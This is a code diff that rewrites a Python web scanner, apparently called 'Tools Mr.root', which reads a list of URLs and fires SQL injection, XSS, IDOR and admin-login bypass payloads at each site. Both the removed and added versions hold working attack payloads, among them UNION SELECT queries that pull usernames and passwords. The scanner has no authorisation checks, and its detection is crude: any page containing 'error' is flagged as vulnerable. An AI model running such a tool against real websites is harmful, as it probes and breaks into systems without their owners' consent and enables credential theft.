@@ -1,143 +1,145 @@
-import requests
-from bs4 import BeautifulSoup
-import pandas as pd
-from colorama import Fore, Style, init
-from tqdm import tqdm
+import time
+import os
 import pyfiglet
+from tqdm import tqdm
+from termcolor import colored
+from prettytable import PrettyTable
+import requests
 
-init(autoreset=True)
+# Welcome message with progress bar
+def show_welcome_message():
+    # Display a loading bar
+    for i in tqdm(range(100), desc="Loading"):
+        time.sleep(0.05)
 
-# Payloads for vulnerabilities
-xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
-sql_payloads = ["' OR 1=1 --", "' AND 1=2 UNION SELECT NULL,NULL --", "' UNION SELECT username, password FROM users --"]
-idor_user_ids = [1, 2, 999, 1000]
-bypass_payloads = [
-    {"username": "' OR 1=1 --", "password": "any"},
-    {"username": "admin", "password": "' OR '1'='1"},
-    {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
-]
+    # Clear the screen and show the welcome banner
+    os.system('clear' if os.name == 'posix' else 'cls')
+    banner = pyfiglet.figlet_format("Welcome to Tools")
+    print(colored(banner, "cyan"))
 
-# Parameters to test
-test_parameters = ["id", "user", "page", "search", "query", "product"]
+    # Wait for 5 seconds, then clear the screen
+    time.sleep(5)
+    os.system('clear' if os.name == 'posix' else 'cls')
 
-# Crawl website for endpoints
-def crawl_website(base_url):
-    endpoints = set()
-    try:
-        response = requests.get(base_url, timeout=10)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        for link in soup.find_all('a', href=True):
-            href = link['href']
-            if href.startswith('/'):
-                full_url = base_url.rstrip('/') + href
-                endpoints.add(full_url)
-            elif base_url in href:
-                endpoints.add(href)
-    except requests.exceptions.RequestException as e:
-        print(Fore.RED + f"Error crawling {base_url}: {e}")
-    return endpoints
+# Display tool name
+def show_tool_name():
+    tool_name = pyfiglet.figlet_format("Tools Mr.root")
+    print(colored(tool_name, "green"))
 
-# Vulnerability scan functions
-def scan_xss(url):
-    results = []
-    for param in test_parameters:
-        for payload in xss_payloads:
-            try:
-                response = requests.get(url, params={param: payload}, timeout=10)
-                if payload in response.text:
-                    results.append({"Path": url, "Parameter": param, "Payload": payload})
-            except requests.exceptions.RequestException:
-                continue
-    return results
-
+# Scan for SQL Injection vulnerabilities
 def scan_sql_injection(url):
-    results = []
-    for param in test_parameters:
-        for payload in sql_payloads:
-            try:
-                response = requests.get(url, params={param: payload}, timeout=10)
-                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "error" in response.text.lower():
-                    results.append({"Path": url, "Parameter": param, "Payload": payload})
-            except requests.exceptions.RequestException:
-                continue
-    return results
+    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "admin' --", "' UNION SELECT null, null --"]
+    for payload in payloads:
+        vulnerable_url = f"{url}?id={payload}"
+        try:
+            response = requests.get(vulnerable_url, timeout=5).text
+            if "error" in response.lower() or "sql" in response.lower():
+                return True, payload
+        except Exception:
+            continue
+    return False, None
 
+# Scan for XSS vulnerabilities
+def scan_xss(url):
+    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'';!--\"<XSS>=&{()}"]
+    for payload in payloads:
+        vulnerable_url = f"{url}?q={payload}"
+        try:
+            response = requests.get(vulnerable_url, timeout=5).text
+            if payload in response:
+                return True, payload
+        except Exception:
+            continue
+    return False, None
+
+# Scan for IDOR vulnerabilities
 def scan_idor(url):
-    results = []
-    for user_id in idor_user_ids:
-        path = f"{url}/{user_id}"
+    sensitive_paths = ["/user/1", "/user/2", "/account/1001", "/account/1002"]
+    for path in sensitive_paths:
+        test_url = f"{url}{path}"
         try:
-            response = requests.get(path, timeout=10)
-            if response.status_code == 200 and "user" in response.text.lower():
-                results.append({"Path": path, "Payload": f"User ID: {user_id}"})
-        except requests.exceptions.RequestException:
+            response = requests.get(test_url, timeout=5).text
+            if "unauthorized" not in response.lower() and "not found" not in response.lower():
+                return True, path
+        except Exception:
             continue
-    return results
+    return False, None
 
-def bypass_admin_panel(admin_url):
-    results = []
-    for payload in bypass_payloads:
+# Scan for Admin Bypass vulnerabilities
+def scan_bypass_admin(url):
+    paths = ["/admin", "/admin/dashboard", "/admin/panel"]
+    for path in paths:
+        test_url = f"{url}{path}"
         try:
-            response = requests.post(admin_url, data=payload, timeout=10)
-            if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
-                results.append({"Path": admin_url, "Payload": payload})
-                break
-        except requests.exceptions.RequestException:
+            response = requests.get(test_url, timeout=5).text
+            if "welcome admin" in response.lower() or "admin panel" in response.lower():
+                return True, path
+        except Exception:
             continue
-    return results
+    return False, None
 
-# Main scan function
-def scan_site(base_url):
-    print(Fore.CYAN + f"Scanning site: {base_url}")
-    endpoints = crawl_website(base_url)
-    vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
-
-    for endpoint in tqdm(endpoints, desc=f"Scanning {base_url}", ncols=100):
-        vulnerabilities["XSS"].extend(scan_xss(endpoint))
-        vulnerabilities["SQL Injection"].extend(scan_sql_injection(endpoint))
-        vulnerabilities["IDOR"].extend(scan_idor(endpoint))
-
-    admin_results = bypass_admin_panel(f"{base_url}/admin")
-    if admin_results:
-        vulnerabilities["Admin Bypass"].extend(admin_results)
-
-    return vulnerabilities
-
-# Display results in separate tables
-def display_results(all_results):
-    for vuln_type, results in all_results.items():
-        if results:
-            print(Fore.GREEN + f"\nResults for {vuln_type}:")
-            df = pd.DataFrame(results)
-            print(Fore.GREEN + df.to_string(index=False))
-        else:
-            print(Fore.RED + f"\nNo {vuln_type} vulnerabilities detected.")
-
-# Entry point
+# Main program
 def main():
-    print(Fore.CYAN + pyfiglet.figlet_format("Root Scanner", font="slant"))
-    filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")
+    # Display welcome message with progress bar
+    show_welcome_message()
 
-    if not filename.endswith('.txt'):
-        print(Fore.RED + "Invalid file format. Please provide a .txt file.")
+    # Display tool name
+    show_tool_name()
+
+    # Request the file name
+    filename = input("Enter the filename containing the list of URLs (e.g., list.txt): ").strip()
+    if not os.path.exists(filename):
+        print(colored("File not found. Please check the filename and path.", "red"))
         return
 
-    try:
-        with open(filename, 'r') as file:
-            urls = [line.strip() for line in file.readlines()]
-    except FileNotFoundError:
-        print(Fore.RED + f"File '{filename}' not found.")
+    # Load URLs from file
+    with open(filename, "r") as file:
+        urls = [line.strip() for line in file if line.strip()]
+
+    if not urls:
+        print(colored("The file is empty or contains invalid URLs.", "red"))
         return
 
-    all_vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
+    # Initialize results table
+    results_table = PrettyTable()
+    results_table.field_names = ["URL", "Vulnerability", "Payload/Path"]
+    results_table.align = "l"
 
-    for base_url in urls:
-        site_results = scan_site(base_url)
-        for vuln_type, results in site_results.items():
-            all_vulnerabilities[vuln_type].extend(results)
+    # Scan each URL
+    for url in urls:
+        print(f"\nScanning: {url}")
+        found = False
 
-    print(Fore.CYAN + "\nScan completed. Results:")
-    display_results(all_vulnerabilities)
+        # SQL Injection
+        sql_injection, sql_payload = scan_sql_injection(url)
+        if sql_injection:
+            results_table.add_row([url, "SQL Injection", sql_payload])
+            found = True
+
+        # XSS
+        xss, xss_payload = scan_xss(url)
+        if xss:
+            results_table.add_row([url, "XSS", xss_payload])
+            found = True
+
+        # IDOR
+        idor, idor_path = scan_idor(url)
+        if idor:
+            results_table.add_row([url, "IDOR", idor_path])
+            found = True
+
+        # Admin Bypass
+        bypass, bypass_path = scan_bypass_admin(url)
+        if bypass:
+            results_table.add_row([url, "Admin Bypass", bypass_path])
+            found = True
+
+        if not found:
+            print(colored(f"No vulnerabilities found for {url}", "red"))
+
+    # Display results
+    print("\nScan Results:")
+    print(results_table)
 
 if __name__ == "__main__":
     main()
